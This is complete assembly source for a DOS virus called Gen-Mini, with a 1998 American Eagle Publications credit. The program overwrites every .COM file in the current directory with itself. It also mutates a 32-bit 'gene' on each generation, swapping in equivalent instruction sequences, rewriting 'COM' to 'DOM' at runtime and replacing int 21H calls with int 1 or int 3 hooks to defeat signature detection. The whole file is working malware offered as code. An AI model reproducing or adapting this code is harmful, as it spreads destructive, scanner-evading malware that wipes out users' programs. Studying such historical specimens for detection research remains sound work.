;Gen-Mini Virus, Generates Mini-Family viruses
;
;(C) 1998 American Eagle Publications,  Inc.

.model  tiny

.code
.386

FNAME           EQU     9EH        ;search-function file name result
MAXSIZECHANGE   EQU     3+7+2+16+1  ;maximum size change of code in 1 generation

        ORG     100H

;Starting point of Gen-Mini
START:
        call    MUTATE                  ;Modify gene occasionally
        call    BUILD_VIRUS             ;Build the virus

SIMPLE_START:                           ;starting point for simple virus
        mov     dx,OFFSET COM_FILE
        mov     ah,4EH                  ;search for *.COM (search first)
        int     21H

SEARCH_LP:
        jc      DONE
        mov     ax,3D01H                ;open file we found
        mov     dx,FNAME
        int     21H

        xchg    ax,bx                   ;write virus to file
        mov     ah,40H
        mov     cx,OFFSET VIRUS_END-OFFSET START+MAXSIZECHANGE ;size of virus
        mov     dx,OFFSET VIRUS_BUFFER  ;location of this virus
        int     21H

        mov     ah,3EH
        int     21H                     ;close file

        mov     ah,4FH
        int     21H                     ;search for next file
        jmp     SEARCH_LP
DONE:
        ret                             ;exit to DOS

COM_FILE        DB      '*.COM',0       ;string for COM file search

GENE            DB      4 dup (0)       ;32-bit gene
                                ;Bit 0 set selects de-evolution
                                ;Bit 1 selects jmp/jnb choice
                                ;Bit 2 selects mov ax,3D01H/composite choice
                                ;Bit 3 selects mov ah,4EH versus use of "OM" in "*.COM"
                                ;Bit 4 selects mov dx,OFFSET COM_FILE/mov bx,OFFSET COM_FILE:mov dx,bx
                                ;Bit 5 selects mov ah,4FH/add ah,11H
                                ;Bit 6 selects changing C in "COM" to D
                                ;Bit 7 \ select terminate routine 0 0 = ret
                                ;Bit 8 / 0 1 = int 20H | 1 0 = mov bx,sp/jmp[bx] | 1 1 = mov ax,4C00H/int 21H
                                ;Bit 9 selects mov eax,3E000000/shr eax,24
                                ;Bit 10 selects mov bx,ax
                                ;Bit 11 selects mov eax,40000H/shr eax,4
                                ;Bit 12 turns off search next & loop
                                ;Bit 13 adds a call SIMPLE_START+3 to start of virus
                                ;Bit 14 \ Selects method for calling interrupt 21H
                                ;Bit 15 / with one of 4 possibilities. See GEN_INT21.

;This routine is passed a bit number in al ranging from 0 to 31. On return
;the 0 bit of al is set to the value of that gene, and the z flag is set
;accordingly. No other registers are affected.
TEST_GENE:
        push    bx
        push    cx
        push    di
        xor     ah,ah
        mov     bh,8
        div     bh              ;divide al by ah, al=quo, ah=rem
        mov     bl,al
        xor     bh,bh
        call    TG1             ;figure out where this code is
TG1:    pop     di
        sub     di,OFFSET TG1
        mov     al,[bx+di+OFFSET GENE]  ;get requested byte of gene
        mov     cl,ah
        shr     al,cl                   ;put requested bit in al
        and     al,1                    ;set z flag
        pop     di
        pop     cx
        pop     bx
        ret

;A simple routine to mutate the gene
MUTATE:
        xor     ax,ax
        mov     es,ax
        mov     bx,46CH
        mov     cl,es:[bx]              ;get system time
        push    ds
        pop     es                      ;restore es
        call    MUT1
MUT1:   pop     di
        sub     di,OFFSET MUT1
        and     cl,31                   ;set cl=0 to 31
        mov     eax,1
        shl     eax,cl
MUT2:   xor     [di+OFFSET GENE],eax    ;perform mutation
MEND:   ret

;This routine builds the virus in memory
BUILD_VIRUS:
        call    GET_SIMPLE_SIZE
        mov     ax,di                   ;size of new virus in ax
        call    BV00
BV00:   pop     di
        sub     di,OFFSET BV00
        add     di,OFFSET VIRUS_BUFFER
        push    ax
        xor     al,al                   ;de-evolve?
        call    TEST_GENE               ;yes, don't need 1st 2 calls
        pop     ax
        jnz     BV001                   ;no - carry on with evolutionary virus
        mov     BYTE PTR [di],0E8H
        inc     di                      ;create first call
        add     ax,3+OFFSET MUTATE - OFFSET GENE  ;ax = @MUTATE
        stosw
        mov     BYTE PTR [di],0E8H
        inc     di                      ;create 2nd call
        add     ax,OFFSET BUILD_VIRUS - OFFSET MUTATE - 3 ;ax=@BUILD_VIRUS
        stosw

BV001:  mov     al,13
        call    TEST_GENE
        jz      BV002
        mov     al,0E8H                 ;Gene 13=1
        stosb                           ;so move "call $+3"
        xor     ax,ax
        stosw

BV002:  mov     al,14
        call    TEST_GENE
        jnz     BV003
        mov     al,15
        call    TEST_GENE
        jnz     BV003
        jmp     BV004
BV003:  mov     ax,0C031H               ;Gene 14,15=1
        stosw                           ;save "xor ax,ax"
        mov     ax,0C08EH               ;     "mov es,ax"
        stosw
        mov     al,14
        call    TEST_GENE
        jz      BV0032
        mov     al,15
        call    TEST_GENE
        jz      BV0032
        jmp     BV004                   ;Gene 14=1, Gene 15=1, all done

BV0032: mov     ax,2666H                ;Gene 14=0, Gene 15=1 or vice versa
        stosw                           ;save "mov eax,es:[84]"
        mov     ax,84A1H
        stosw
        xor     al,al
        stosb

        mov     ax,2666H                ;start of next instr, "mov es:[x],eax"
        stosw
        mov     al,0A3H
        stosb
        mov     al,14
        call    TEST_GENE
        jz      BV0034
        mov     ax,4                    ;Gene 14=1, Gene 15=0
        stosw                           ;so x=4 (int 1)
        jmp     BV004
BV0034: mov     ax,12                   ;Gene 14=0, Gene 15=1
        stosw                           ;so x=12 (int 3)
BV004:  mov     al,4
        call    TEST_GENE               ;gene 4 on?
        pushf
        jz      BVA01
        mov     al,0BBH                 ;save "mov bx,IMM"
        jmp     SHORT BVA02
BVA01:  mov     al,0BAH
BVA02:  stosb                           ;move "mov dx,IMM"

        push    di
        call    GET_SIMPLE_SIZE
        add     di,100H+6-6
        xor     al,al
        call    TEST_GENE               ;de-evolve?
        jz      BVA025
        sub     di,6                    ;yes, subtract 6 for missing calls
BVA025: mov     ax,di
        pop     di
        stosw                           ;save OFFSET COM_FILE

        popf                            ;test gene 4 again
        jz      BVA03
        mov     ax,0DA89H               ;on, so
        stosw                           ;save "mov dx,bx"

BVA03:  mov     al,3
        call    TEST_GENE               ;Gene 3 on?
        jz      BVA1                    ;nope, continue

        mov     al,4                    ;yes, see if Gene 4 on too
        call    TEST_GENE
        jnz     BVA04
        mov     ax,0DA8BH               ;no, so we need to
        stosw                           ;save "mov bx,dx"
BVA04:  mov     ax,478BH                ;if gene 3 or 4 on, come here
        stosw
        mov     al,3
        stosb                           ;save "mov ax,[bx+3]"
        mov     ax,0C400H
        stosw                           ;save "add ah,al"
        mov     ax,0ECD0H
        stosw                           ;save "shr ah,1"
        jmp     SHORT BVA2

BVA1:   mov     ax,4EB4H
        stosw                           ;move "mov ah,4EH"

BVA2:   call    TEST634                 ;test for gene 6 with 3 or 4
        jz      BVA4
        mov     ax,06C6H                ;ok, save "mov BYTE PTR [$+7],4"
        stosw
        call    GET_MOD4
        stosw
        push    ax
        mov     al,4
        stosb
        mov     al,0FEH                 ;next,
        stosb
        mov     ax,024FH                ;save "dec BYTE PTR [bx+2]" turns D in DOM to COM
        stosw

BVA4:   call    GEN_INT21               ;Generate an interrupt 21H instruction or equivalent

        call    TEST634
        jz      BVA6
        mov     al,0FEH                 ;ok, we have 6 with 3 or 4
        stosb
        mov     ax,0247H                ;save "inc BYTE PTR [bx+2]" turns C in COM to DOM
        stosw
        mov     ax,06C6H                ;save "mov BYTE PTR [$+7],2"
        stosw
        pop     ax
        stosw
        mov     al,2
        stosb

BVA6:   call    GET_JMP1                ;get jump distance
        mov     ah,al
        mov     al,72H                  ;and create "jc DONE"
        stosw

        mov     al,0B8H
        stosb                           ;put in "mov ax," instruction
        mov     al,2                    ;check gene 2 for mov ax,3D01H
        call    TEST_GENE
        jz      BV01                    ;gene not on, so just go with mov
        push    es
        xor     ax,ax
        mov     es,ax
        mov     bx,46EH
        mov     ax,es:[bx-2]            ;sort of random number for xor
        xor     ax,es:[bx]
        pop     es
        stosw                           ;save random in mov ax,RND
        xor     ax,3D01H                ;xor to get ax=3D01
        push    ax
        mov     ax,35H                  ;"xor ax," instruction
        stosb
        pop     ax
        stosw
        jmp     BV02

BV01:   mov     ax,3D01H                ;else put 3D01H in "mov ax,IMM"
        stosw

BV02:   mov     al,0BAH
        stosb
        mov     ax,FNAME
        stosw                           ;move "mov dx,FNAME"

        call    GEN_INT21               ;save call to int 21H

        mov     al,10
        call    TEST_GENE
        jnz     BV021
        mov     al,93H                  ;Gene 10=0, so
        stosb                           ;move "xchg ax,bx"
        jmp     BV022

BV021:  mov     ax,0C389H               ;Gene 10=1 so
        stosw                           ;move "mov bx,ax"

BV022:  mov     al,11
        call    TEST_GENE
        jz      BV023
        mov     ax,0B866H               ;Gene 11=1, so
        stosw                           ;"mov eax,40000"
        xor     ax,ax                   ;"shr eax,4"
        stosw
        mov     al,4
        stosw
        mov     ax,0C166H
        stosw
        mov     ax,04E8H
        stosw
        jmp     BV024

BV023:  mov     ax,40B4H                ;Gene 11=0 so
        stosw                           ;move "mov ah,40H"

BV024:  mov     al,0B9H
        stosb                           ;move "mov cx,IMM"
        xor     al,al
        call    TEST_GENE
        pushf
        push    di
        call    GET_SIMPLE_SIZE
        mov     ax,di
        pop     di
        popf
        jnz     BV02X
        add     ax,OFFSET VIRUS_END - OFFSET GENE + 6 + MAXSIZECHANGE
BV02X:  stosw                           ;move size of virus

        push    ax
        mov     al,0BAH
        stosb                           ;move "mov dx,IMM"
        xor     al,al
        call    TEST_GENE               ;de-evolve?
        jnz     BV02A
        pop     ax
        add     ax,100H-MAXSIZECHANGE   ;add 100H to find buffer
        jmp     BV02B
BV02A:  pop     ax
        mov     ax,100H                 ;de-evolve, buffer=self
BV02B:  stosw                           ;save buffer address

        call    GEN_INT21               ;save call to interrupt 21H

        mov     al,9
        call    TEST_GENE
        jne     BV02C
        mov     ax,3EB4H                ;gene 9=0 so
        stosw                           ;move "mov ah,3EH"
        jmp     BV02D

BV02C:  mov     ax,0B866H               ;gene 9=1 so
        stosw                           ;"mov eax,3E000000H"
        xor     ax,ax                   ;"shr eax,24"
        stosw
        mov     ah,3EH
        stosw
        mov     ax,0C166H
        stosw
        mov     ax,18E8H
        stosw

BV02D:  call    GEN_INT21               ;generate call to int 21H

        mov     al,12
        call    TEST_GENE
        jnz     BV20

        mov     al,5
        call    TEST_GENE
        jz      BVB1
        mov     al,80H
        stosb
        mov     ax,11C4H                ;move "add ah,11H"
        jmp     SHORT BVB2
BVB1:   mov     ax,4FB4H
BVB2:   stosw                           ;move "mov ah,4FH"

        call    GEN_INT21               ;generate interrupt 21H

        mov     al,1                    ;now build loop-jump (jmp SEARCH_LP)
        call    TEST_GENE
        jnz     BV1
        call    GET_JMP2
        mov     ah,al
        mov     al,0EBH                 ;ax = "JMP SEARCH_LP"
        jmp     SHORT BV2
BV1:    call    GET_JMP2
        mov     ah,al
        add     ah,2
        mov     al,73H                  ;ax = "JNC SEARCH_LP+2"
BV2:    stosw

BV20:   mov     al,7
        call    TEST_GENE
        mov     al,8
        jnz     BV22
        call    TEST_GENE
        jnz     BV21
        mov     al,0C3H                 ;Gene 7 & 8 = 0 so
        stosb                           ;move "ret"
        jmp     BV3

BV21:   mov     ax,20CDH                ;Gene 7 = 0, Gene 8 = 1
        stosw                           ;so move "int 20H"
        jmp     BV3

BV22:   call    TEST_GENE               ;test Gene 8
        jnz     BV23
        mov     ax,0E389H               ;Gene 7 = 1, Gene 8 = 0
        stosw                           ;so move "mov bx,sp"
        mov     ax,27FFH
        stosw                           ;and "jmp [bx]"
        jmp     BV3

BV23:   mov     ax,00B8H                ;Gene 7 = 1, Gene 8 = 1
        stosw
        mov     al,4CH                  ;so move "mov ax,4C00H"
        stosb
        mov     ax,21CDH                ;Interrupt 21H to exit
        stosw

BV3:
        mov     ax,'.*'
        stosw

        call    TEST634                 ;test for gene 6 with 3 or 4
        jz      BVD1
        mov     al,'D'                  ;gene 6 changes COM to DOM if 3 or 4 is on
        jmp     SHORT BVD2
BVD1:   mov     al,'C'
BVD2:   stosb

        mov     al,'O'
        stosb
        mov     ax,'M'
        stosw                           ;move "*.COM"

        xor     al,al                   ;de-evolve?
        call    TEST_GENE
        jnz     BV5                     ;yes, don't copy evolutionary part
        call    BV4
BV4:    pop     si
        sub     si,OFFSET BV4
        add     si,OFFSET GENE          ;set up si for move
        mov     cx,OFFSET VIRUS_END - OFFSET GENE
        rep     movsb                   ;move genetic part of virus
BV5:    ret

;Generate an Interrupt 21H instruction or equivalent, depending on genes
;14 and 15.
GEN_INT21:
        mov     al,14
        call    TEST_GENE
        jz      GI2
        mov     al,15
        call    TEST_GENE
        jz      GI15
        mov     ax,269CH                ;Gene 14 = 1, Gene 15 = 1
        stosw                           ;save "pushf"
        mov     ax,1EFFH                ;     "call far es:[0084]"
        stosw
        mov     ax,84H
        stosw                           ;6 bytes
        jmp     GIX
GI15:   mov     ax,01CDH                ;Gene 14 = 1, Gene 15 = 0
        stosw                           ;save "int 1"           ;2 bytes
        jmp     GIX
GI2:    mov     al,15
        call    TEST_GENE
        jz      GI25
        mov     al,0CCH                 ;Gene 14 = 0, Gene 15 = 1
        stosb                           ;save "int 3"           ;1 byte
        jmp     GIX
GI25:   mov     ax,21CDH                ;Gene 14 = 0, Gene 15 = 0
        stosw                           ;move "int 21H"         ;2 bytes
GIX:    ret

;This tests for the presence of gene 6 with 3 or 4. It returns NZ if
;that condition is satisfied.
TEST634:
        mov     al,3
        call    TEST_GENE
        jnz     T6341
        mov     al,4
        call    TEST_GENE
        jz      T634F
T6341:  mov     al,6
        call    TEST_GENE
T634F:  ret

;This is only called when Gene 6 is active. It finds the location of the
;"2" in the "dec BYTE PTR [bx+2]" instruction and returns it in ax.
GET_MOD4:
        push    di
        mov     di,106H
        xor     al,al
        call    TEST_GENE
        jz      GM40
        sub     di,6
GM40:   mov     al,4
        call    TEST_GENE
        jz      GM41
        add     di,14
        mov     al,3
        call    TEST_GENE
        jz      GM42
        add     di,5
        jmp     SHORT GM42
GM41:   add     di,19
GM42:   mov     al,13
        call    TEST_GENE
        jz      GM43
        add     di,3
GM43:   mov     al,14
        call    TEST_GENE
        jnz     GM44
        mov     al,15
        call    TEST_GENE
        jz      GM45            ;14=0, 15=0
        add     di,14           ;14=0, 15=1
        jmp     GM45
GM44:   add     di,4
        mov     al,15
        call    TEST_GENE
        jnz     GM45            ;14=1, 15=1, adding 4 is enough
        add     di,10           ;14=1, 15=0, add 10 more
GM45:   mov     ax,di
        pop     di
        ret

;Finds the size of the simple virus, and put it in DI.
GET_SIMPLE_SIZE:
        push    ax
        mov     di,OFFSET GENE - OFFSET SIMPLE_START
        mov     al,2
        call    TEST_GENE
        jz      GSS1
        add     di,3
GSS1:   mov     al,3
        call    TEST_GENE
        jz      GSS2
        add     di,7
GSS2:   mov     al,4            ;if gene 4 on and 3 off, add 2
        call    TEST_GENE
        jz      GSS25
        mov     al,3
        call    TEST_GENE
        jnz     GSS25
        add     di,2
GSS25:  mov     al,12
        call    TEST_GENE
        jz      GSS3
        sub     di,6
        jmp     GSS4            ;gene 12 supercedes 5
GSS3:   mov     al,5
        call    TEST_GENE
        jz      GSS4
        inc     di
GSS4:   call    TEST634
        jz      GSS5
        add     di,16
GSS5:   mov     al,7            ;work out combination of genes 7 & 8
        call    TEST_GENE
        jnz     GSS6
        mov     al,8
        call    TEST_GENE
        jz      GSS7            ;7=0, 8=0, don't need to add anything
        inc     di              ;7=0, 8=1, so add 1
        jmp     GSS7
GSS6:   add     di,3            ;7=1 here, so must add at least 3
        mov     al,8
        call    TEST_GENE
        jz      GSS7            ;7=1, 8=0, so 3 was all that was needed
        inc     di              ;7=1, 8=1, so add 1 more
GSS7:   mov     al,9
        call    TEST_GENE
        jz      GSS8
        add     di,8
GSS8:   mov     al,10
        call    TEST_GENE
        jz      GSS9
        inc     di
GSS9:   mov     al,11
        call    TEST_GENE
        jz      GSS10
        add     di,8
GSS10:  mov     al,13
        call    TEST_GENE
        jz      GSS11
        add     di,3
GSS11:  mov     al,14
        call    TEST_GENE
        jnz     GSS12
        mov     al,15
        call    TEST_GENE
        jz      GSS13           ;14=0, 15=0
        add     di,14-5         ;14=0, 15=1
        jmp     GSS13
GSS12:  add     di,4+4*5
        mov     al,15
        call    TEST_GENE
        jnz     GSS13           ;14=1, 15=1, adding 4 is enough
        add     di,10           ;14=1, 15=0, add 10 more
        sub     di,4*5          ;            & subtract 4*5
GSS13:  pop     ax
        ret


;Finds the size of the jump for the "jc DONE" and returns it in al.
GET_JMP1:
        push    di
        mov     di,OFFSET DONE - OFFSET SEARCH_LP - 2
        mov     al,2
        call    TEST_GENE
        jz      GJ10
        add     di,3
GJ10:   mov     al,12
        call    TEST_GENE
        jz      GJ11
        sub     di,6
        jmp     GJ12            ;gene 12 supercedes 5
GJ11:   mov     al,5
        call    TEST_GENE
        jz      GJ12
        inc     di
GJ12:   mov     al,9
        call    TEST_GENE
        jz      GJ13
        add     di,8
GJ13:   mov     al,10
        call    TEST_GENE
        jz      GJ14
        inc     di
GJ14:   mov     al,11
        call    TEST_GENE
        jz      GJ15
        add     di,8
GJ15:   mov     al,14
        call    TEST_GENE
        jnz     GJ16
        mov     al,15
        call    TEST_GENE
        jz      GJ17            ;14=0, 15=0
        sub     di,4            ;14=0, 15=1
        jmp     GJ17
GJ16:   mov     al,15
        call    TEST_GENE
        jz      GJ17            ;14=1, 15=0, ok
        add     di,4*5          ;14=1, 15=1 add 4*5 more
GJ17:   mov     ax,di
        pop     di
        ret

;Finds the size of the jump for the "jmp SEARCH_LP" and returns it in al.
;Note: If gene 12 is on, this never gets called, so gene 12 is not included
;in the computation.
;Note: because this is a backward jump, di should be negative. For a bigger
;jump, subtract from di.
GET_JMP2:
        push    di
        mov     di,OFFSET SEARCH_LP - OFFSET DONE
        mov     al,2
        call    TEST_GENE
        jz      GJ21
        sub     di,3
GJ21:   mov     al,5
        call    TEST_GENE
        jz      GJ22
        dec     di
GJ22:   mov     al,9
        call    TEST_GENE
        jz      GJ23
        sub     di,8
GJ23:   mov     al,10
        call    TEST_GENE
        jz      GJ24
        dec     di
GJ24:   mov     al,11
        call    TEST_GENE
        jz      GJ25
        sub     di,8
GJ25:   mov     al,14
        call    TEST_GENE
        jnz     GJ26
        mov     al,15
        call    TEST_GENE
        jz      GJ27            ;14=0, 15=0
        add     di,4            ;14=0, 15=1
        jmp     GJ27
GJ26:   mov     al,15
        call    TEST_GENE
        jz      GJ27            ;14=1, 15=0, ok
        sub     di,4*5          ;14=1, 15=1 add 4*5 more
GJ27:   mov     ax,di
        pop     di
        ret

VIRUS_END:

;Data area to build virus
VIRUS_BUFFER    DB      200H dup (?)

        END     START
